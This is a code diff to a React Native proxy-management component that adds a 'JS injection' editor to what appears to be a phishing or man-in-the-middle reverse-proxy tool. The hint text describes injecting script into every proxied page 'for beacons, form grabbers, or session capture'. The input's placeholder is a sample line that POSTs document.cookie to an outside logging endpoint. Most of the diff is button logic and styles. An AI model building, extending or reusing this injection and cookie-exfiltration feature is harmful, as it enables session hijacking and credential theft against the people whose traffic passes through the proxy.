@@ -4,6 +4,7 @@ import {
   ArrowRight,
   Bug,
   Check,
+  Code2,
   Copy,
   Globe,
   Link2,
@@ -132,6 +133,8 @@ function ProxyCard({ proxy }: { proxy: Proxy }) {
   const [copied, setCopied] = useState<boolean>(false);
   const [domainCopied, setDomainCopied] = useState<boolean>(false);
   const [showDomains, setShowDomains] = useState<boolean>(false);
+  const [showInject, setShowInject] = useState<boolean>(false);
+  const [injectJsDraft, setInjectJsDraft] = useState<string>(proxy.injectJs ?? "");
   const [_, setAllocating] = useState<boolean>(false);
 
   const url = proxyUrl(proxy.slug);
@@ -157,6 +160,15 @@ function ProxyCard({ proxy }: { proxy: Proxy }) {
   const toggleIntercept = useCallback(() => {
     updateProxy.mutate({ id: proxy.id, interceptEnabled: !proxy.interceptEnabled });
   }, [updateProxy, proxy.id, proxy.interceptEnabled]);
+
+  const toggleInjectJs = useCallback(() => {
+    updateProxy.mutate({ id: proxy.id, injectJsEnabled: !proxy.injectJsEnabled });
+  }, [updateProxy, proxy.id, proxy.injectJsEnabled]);
+
+  const saveInjectJs = useCallback(() => {
+    const trimmed = injectJsDraft.trim();
+    updateProxy.mutate({ id: proxy.id, injectJs: trimmed, injectJsEnabled: trimmed.length > 0 });
+  }, [updateProxy, proxy.id, injectJsDraft]);
 
   const remove = useCallback(() => {
     const run = () => deleteProxy.mutate(proxy.id);
@@ -241,6 +253,109 @@ function ProxyCard({ proxy }: { proxy: Proxy }) {
       </Pressable>
 
       {showDomains ? <DomainPanel proxy={proxy} /> : null}
+
+      <Pressable
+        onPress={() => {
+          setShowInject((v) => !v);
+          setInjectJsDraft(proxy.injectJs ?? "");
+        }}
+        style={({ pressed }) => [
+          styles.injectBtn,
+          pressed && styles.pressed,
+          proxy.injectJsEnabled && styles.injectBtnActive,
+        ]}
+      >
+        <Code2
+          size={14}
+          color={
+            proxy.injectJsEnabled ? theme.colors.warn : theme.colors.textFaint
+          }
+        />
+        <Text
+          style={[
+            styles.injectBtnText,
+            {
+              color: proxy.injectJsEnabled
+                ? theme.colors.warn
+                : theme.colors.textDim,
+            },
+          ]}
+        >
+          {proxy.injectJsEnabled
+            ? `JS injection active${proxy.injectJs ? ` (${proxy.injectJs.length} chars)` : ""}`
+            : showInject
+              ? "Hide JS editor"
+              : "Inject JavaScript"}
+        </Text>
+      </Pressable>
+
+      {showInject ? (
+        <View style={styles.injectPanel}>
+          <Text style={styles.injectHint}>
+            Custom JavaScript snippet injected into every proxied HTML page via
+            HTMLRewriter. Use for beacons, form grabbers, or session capture.
+            Runs after the built-in SPA rewriting script.
+          </Text>
+          <TextInput
+            value={injectJsDraft}
+            onChangeText={setInjectJsDraft}
+            placeholder={'fetch("https://your-log.endpoint/beacon",{method:"POST",body:document.cookie})'}
+            placeholderTextColor={theme.colors.textFaint}
+            style={styles.injectInput}
+            multiline
+            autoCapitalize="none"
+            autoCorrect={false}
+            textAlignVertical="top"
+          />
+          <View style={styles.injectActions}>
+            <Pressable
+              onPress={toggleInjectJs}
+              disabled={updateProxy.isPending}
+              style={({ pressed }) => [
+                styles.actionBtnSm,
+                pressed && styles.pressed,
+                proxy.injectJsEnabled && styles.actionBtnSmWarn,
+              ]}
+            >
+              <Power
+                size={12}
+                color={
+                  proxy.injectJsEnabled
+                    ? theme.colors.warn
+                    : theme.colors.textFaint
+                }
+              />
+              <Text
+                style={[
+                  styles.actionTextSm,
+                  {
+                    color: proxy.injectJsEnabled
+                      ? theme.colors.warn
+                      : theme.colors.textDim,
+                  },
+                ]}
+              >
+                {proxy.injectJsEnabled ? "On" : "Off"}
+              </Text>
+            </Pressable>
+            <Pressable
+              onPress={saveInjectJs}
+              disabled={updateProxy.isPending}
+              style={({ pressed }) => [
+                styles.saveInjectBtn,
+                pressed && styles.pressed,
+              ]}
+            >
+              {updateProxy.isPending ? (
+                <ActivityIndicator size="small" color={theme.colors.bg} />
+              ) : (
+                <Check size={14} color={theme.colors.bg} />
+              )}
+              <Text style={styles.saveInjectText}>Save snippet</Text>
+            </Pressable>
+          </View>
+        </View>
+      ) : null}
 
       <View style={styles.cardActions}>
         <Pressable
@@ -761,5 +876,69 @@ const styles = StyleSheet.create({
     fontFamily: theme.font.mono,
     flex: 1,
     flexShrink: 1,
+  },
+  injectBtn: {
+    flexDirection: "row",
+    alignItems: "center",
+    justifyContent: "center",
+    gap: theme.spacing(2),
+    backgroundColor: theme.colors.surfaceAlt,
+    borderRadius: theme.radius.sm,
+    paddingVertical: theme.spacing(2.5),
+    borderWidth: 1,
+    borderColor: "transparent",
+  },
+  injectBtnActive: {
+    borderColor: theme.colors.warn,
+  },
+  injectBtnText: {
+    fontSize: 13,
+    fontWeight: "700",
+  },
+  injectPanel: {
+    backgroundColor: theme.colors.bg,
+    borderRadius: theme.radius.sm,
+    borderWidth: 1,
+    borderColor: theme.colors.warn,
+    padding: theme.spacing(3),
+    gap: theme.spacing(2),
+  },
+  injectHint: {
+    color: theme.colors.textDim,
+    fontSize: 11,
+    lineHeight: 17,
+    fontFamily: theme.font.mono,
+  },
+  injectInput: {
+    backgroundColor: theme.colors.surface,
+    borderRadius: theme.radius.sm,
+    borderWidth: 1,
+    borderColor: theme.colors.border,
+    paddingHorizontal: theme.spacing(3),
+    paddingVertical: theme.spacing(2.5),
+    color: theme.colors.warn,
+    fontSize: 12,
+    fontFamily: theme.font.mono,
+    minHeight: 100,
+    lineHeight: 17,
+  },
+  injectActions: {
+    flexDirection: "row",
+    gap: theme.spacing(2),
+    justifyContent: "flex-end",
+  },
+  saveInjectBtn: {
+    flexDirection: "row",
+    alignItems: "center",
+    gap: theme.spacing(1.5),
+    backgroundColor: theme.colors.warn,
+    borderRadius: theme.radius.sm,
+    paddingHorizontal: theme.spacing(3),
+    paddingVertical: theme.spacing(2.5),
+  },
+  saveInjectText: {
+    color: theme.colors.bg,
+    fontSize: 12,
+    fontWeight: "700",
   },
 });
